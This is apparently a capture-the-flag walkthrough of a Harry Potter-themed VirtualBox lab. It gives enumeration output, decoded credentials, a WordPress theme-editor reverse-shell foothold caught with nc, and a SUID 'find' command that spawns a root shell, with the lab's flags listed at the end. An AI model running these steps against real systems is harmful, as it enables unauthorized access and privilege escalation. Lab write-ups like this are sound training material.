<pre>
Enum Open port:
    80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-server-header: Apache/2.4.46 (Ubuntu)
|_http-title: Draco:dG9vIGVhc3kgbm8/IFBvdHRlcg==
MAC Address: 08:00:27:8A:AB:C5 (Oracle VirtualBox virtual NIC)

Enum 80 port:
    /.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/log (Status: 200) => pass:OjppbGlrZXNvY2tz => ::ilikesocks
/phpinfo.php (Status: 200)
/server-status (Status: 403)


Reverse shell:
    Login in http://192.168.1.32/DiagonAlley/wp-login.php/
        draco:slytherin

    Go to Edit themes < Theme editor and go to index.php
        Replace the code with a php reverse shell 
        Go to your attack box and make a nc listener and got reverse shell!



Priv Esc:
    Enum with linpeas.sh:
        Critical exploit:
            /bin/find
    Exploit: SUID

        $ find . -exec /bin/sh -p \; -quit
        # id
        uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)


User Flag: flag1{28327a4964cb391d74111a185a5047ad}
Root Flag: root{63a9f0ea7bb98050796b649e85481845!!}
</pre>
